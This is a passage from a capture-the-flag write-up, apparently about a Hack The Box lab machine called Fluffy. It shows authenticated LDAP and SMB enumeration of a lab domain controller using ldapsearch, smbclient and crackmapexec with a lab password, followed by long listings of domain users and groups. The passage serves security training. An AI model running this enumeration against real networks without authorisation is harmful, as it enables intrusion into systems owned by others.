</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>LDAP<span class="w">        </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">389</span><span class="w">    </span>fluffy.htb<span class="w">       </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Error<span class="w"> </span>retrieving<span class="w"> </span>os<span class="w"> </span>arch<span class="w"> </span>of<span class="w"> </span><span class="m">10</span>.10.11.69:<span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>connect:<span class="w"> </span>timed<span class="w"> </span>out
</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>LDAP<span class="w">        </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">389</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\p</span>.agila:prometheusx-303<span class="w"> </span>
</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>rdp<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span></code></pre></div><br />
according to the output, with those creds we can login on <code>SMB</code> and <code>LDAP</code> </p>
<h2 id="ldap-enumeration-as-pagila">LDAP enumeration as p.agila</h2>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://fluffy.htb<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;p.agila@fluffy.htb&quot;</span><span class="w"> </span>-W<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;dc=fluffy,dc=htb&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=group)&quot;</span>
</span></code></pre></div><br />
this prints some interesting stuff but nothing too obvious, lets move on with the SMB enumeration</p>
<h2 id="smb-enumeration-as-pagila">SMB enumeration as p.agila</h2>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>smbclient<span class="w"> </span>-U<span class="w"> </span>p.agila<span class="w"> </span>-L<span class="w"> </span>fluffy.htb
</span></code></pre></div><br />
hm we see the user has access to the exact same shares, nothing valuable found regarding shares</p>
<p>lets try displaying more  info with crackmapexec, first for the users:</p>
<h3 id="enumerating-users">Enumerating Users</h3>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span>p.agila<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>--users
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>└──╼<span class="w"> </span><span class="nv">$crackmapexec</span><span class="w"> </span>smb<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span>p.agila<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>--users
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>First<span class="w"> </span><span class="nb">time</span><span class="w"> </span>use<span class="w"> </span>detected
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>home<span class="w"> </span>directory<span class="w"> </span>structure
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>missing<span class="w"> </span>folder<span class="w"> </span>logs
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>missing<span class="w"> </span>folder<span class="w"> </span>modules
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>missing<span class="w"> </span>folder<span class="w"> </span>protocols
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>missing<span class="w"> </span>folder<span class="w"> </span>workspaces
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>missing<span class="w"> </span>folder<span class="w"> </span>obfuscated_scripts
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>missing<span class="w"> </span>folder<span class="w"> </span>screenshots
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Copying<span class="w"> </span>default<span class="w"> </span>configuration<span class="w"> </span>file
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\p</span>.agila:prometheusx-303<span class="w"> </span>
</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>dump<span class="w"> </span><span class="nb">local</span><span class="w"> </span>users<span class="w"> </span>with<span class="w"> </span>SAMRPC<span class="w"> </span>protocol
</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>domain<span class="w"> </span>user<span class="o">(</span>s<span class="o">)</span>
</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\A</span>dministrator<span class="w">                  </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>administering<span class="w"> </span>the<span class="w"> </span>computer/domain
</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\G</span>uest<span class="w">                          </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>guest<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>computer/domain
</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\k</span>rbtgt<span class="w">                         </span>Key<span class="w"> </span>Distribution<span class="w"> </span>Center<span class="w"> </span>Service<span class="w"> </span>Account
</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\c</span>a_svc<span class="w">                         </span>
</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\l</span>dap_svc<span class="w">                       </span>
</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\p</span>.agila<span class="w">                        </span>
</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\w</span>inrm_svc<span class="w">                      </span>
</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\j</span>.coffey<span class="w">                       </span>
</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>fluffy.htb<span class="se">\j</span>.fleischman<span class="w">    </span>
</span></code></pre></div></p>
<h3 id="enumerating-groups">Enumerating Groups</h3>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span>p.agila<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>--groups
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>└──╼<span class="w"> </span><span class="nv">$crackmapexec</span><span class="w"> </span>smb<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span>p.agila<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;prometheusx-303&#39;</span><span class="w"> </span>--groups
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\p</span>.agila:prometheusx-303<span class="w"> </span>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>domain<span class="w"> </span>group<span class="o">(</span>s<span class="o">)</span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Service<span class="w"> </span>Accounts<span class="w">                         </span>membercount:<span class="w"> </span><span class="m">3</span>
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Service<span class="w"> </span>Account<span class="w"> </span>Managers<span class="w">                 </span>membercount:<span class="w"> </span><span class="m">2</span>
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>DnsUpdateProxy<span class="w">                           </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>DnsAdmins<span class="w">                                </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Enterprise<span class="w"> </span>Key<span class="w"> </span>Admins<span class="w">                    </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Key<span class="w"> </span>Admins<span class="w">                               </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Protected<span class="w"> </span>Users<span class="w">                          </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Cloneable<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="w">             </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Enterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="w">  </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="w">             </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="w">   </span>membercount:<span class="w"> </span><span class="m">8</span>
</span><span id="__span-26-16"><a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Allowed<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="w">  </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-17"><a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Terminal<span class="w"> </span>Server<span class="w"> </span>License<span class="w"> </span>Servers<span class="w">          </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-18"><a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Windows<span class="w"> </span>Authorization<span class="w"> </span>Access<span class="w"> </span>Group<span class="w">       </span>membercount:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-19"><a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Incoming<span class="w"> </span>Forest<span class="w"> </span>Trust<span class="w"> </span>Builders<span class="w">           </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-20"><a id="__codelineno-26-20" name="__codelineno-26-20" href="#__codelineno-26-20"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Pre-Windows<span class="w"> </span><span class="m">2000</span><span class="w"> </span>Compatible<span class="w"> </span>Access<span class="w">       </span>membercount:<span class="w"> </span><span class="m">2</span>
</span><span id="__span-26-21"><a id="__codelineno-26-21" name="__codelineno-26-21" href="#__codelineno-26-21"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Account<span class="w"> </span>Operators<span class="w">                        </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-22"><a id="__codelineno-26-22" name="__codelineno-26-22" href="#__codelineno-26-22"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Server<span class="w"> </span>Operators<span class="w">                         </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-23"><a id="__codelineno-26-23" name="__codelineno-26-23" href="#__codelineno-26-23"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>RAS<span class="w"> </span>and<span class="w"> </span>IAS<span class="w"> </span>Servers<span class="w">                      </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-24"><a id="__codelineno-26-24" name="__codelineno-26-24" href="#__codelineno-26-24"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners<span class="w">              </span>membercount:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-25"><a id="__codelineno-26-25" name="__codelineno-26-25" href="#__codelineno-26-25"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Domain<span class="w"> </span>Guests<span class="w">                            </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-26"><a id="__codelineno-26-26" name="__codelineno-26-26" href="#__codelineno-26-26"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Domain<span class="w"> </span>Users<span class="w">                             </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-27"><a id="__codelineno-26-27" name="__codelineno-26-27" href="#__codelineno-26-27"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Domain<span class="w"> </span>Admins<span class="w">                            </span>membercount:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-28"><a id="__codelineno-26-28" name="__codelineno-26-28" href="#__codelineno-26-28"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Cert<span class="w"> </span>Publishers<span class="w">                          </span>membercount:<span class="w"> </span><span class="m">2</span>
</span><span id="__span-26-29"><a id="__codelineno-26-29" name="__codelineno-26-29" href="#__codelineno-26-29"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Enterprise<span class="w"> </span>Admins<span class="w">                        </span>membercount:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-30"><a id="__codelineno-26-30" name="__codelineno-26-30" href="#__codelineno-26-30"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Schema<span class="w"> </span>Admins<span class="w">                            </span>membercount:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-31"><a id="__codelineno-26-31" name="__codelineno-26-31" href="#__codelineno-26-31"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Domain<span class="w"> </span>Controllers<span class="w">                       </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-32"><a id="__codelineno-26-32" name="__codelineno-26-32" href="#__codelineno-26-32"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Domain<span class="w"> </span>Computers<span class="w">                         </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-33"><a id="__codelineno-26-33" name="__codelineno-26-33" href="#__codelineno-26-33"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Storage<span class="w"> </span>Replica<span class="w"> </span>Administrators<span class="w">           </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-34"><a id="__codelineno-26-34" name="__codelineno-26-34" href="#__codelineno-26-34"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Remote<span class="w"> </span>Management<span class="w"> </span>Users<span class="w">                  </span>membercount:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-35"><a id="__codelineno-26-35" name="__codelineno-26-35" href="#__codelineno-26-35"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Access<span class="w"> </span>Control<span class="w"> </span>Assistance<span class="w"> </span>Operators<span class="w">      </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-36"><a id="__codelineno-26-36" name="__codelineno-26-36" href="#__codelineno-26-36"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Hyper-V<span class="w"> </span>Administrators<span class="w">                   </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-37"><a id="__codelineno-26-37" name="__codelineno-26-37" href="#__codelineno-26-37"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>RDS<span class="w"> </span>Management<span class="w"> </span>Servers<span class="w">                   </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-38"><a id="__codelineno-26-38" name="__codelineno-26-38" href="#__codelineno-26-38"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>RDS<span class="w"> </span>Endpoint<span class="w"> </span>Servers<span class="w">                     </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-39"><a id="__codelineno-26-39" name="__codelineno-26-39" href="#__codelineno-26-39"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>RDS<span class="w"> </span>Remote<span class="w"> </span>Access<span class="w"> </span>Servers<span class="w">                </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-40"><a id="__codelineno-26-40" name="__codelineno-26-40" href="#__codelineno-26-40"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Certificate<span class="w"> </span>Service<span class="w"> </span>DCOM<span class="w"> </span>Access<span class="w">          </span>membercount:<span class="w"> </span><span class="m">1</span>
</span><span id="__span-26-41"><a id="__codelineno-26-41" name="__codelineno-26-41" href="#__codelineno-26-41"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Event<span class="w"> </span>Log<span class="w"> </span>Readers<span class="w">                        </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-42"><a id="__codelineno-26-42" name="__codelineno-26-42" href="#__codelineno-26-42"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Cryptographic<span class="w"> </span>Operators<span class="w">                  </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-43"><a id="__codelineno-26-43" name="__codelineno-26-43" href="#__codelineno-26-43"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>IIS_IUSRS<span class="w">                                </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-44"><a id="__codelineno-26-44" name="__codelineno-26-44" href="#__codelineno-26-44"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Distributed<span class="w"> </span>COM<span class="w"> </span>Users<span class="w">                    </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-45"><a id="__codelineno-26-45" name="__codelineno-26-45" href="#__codelineno-26-45"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Performance<span class="w"> </span>Log<span class="w"> </span>Users<span class="w">                    </span>membercount:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-26-46"><a id="__codelineno-26-46" name="__codelineno-26-46" href="#__codelineno-26-46"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Performance<span class="w"> </span>Monitor<span class="w"> </span>Users<span class="w">                </span>membercount:<span class="w"> </span><span class="m">0</span>
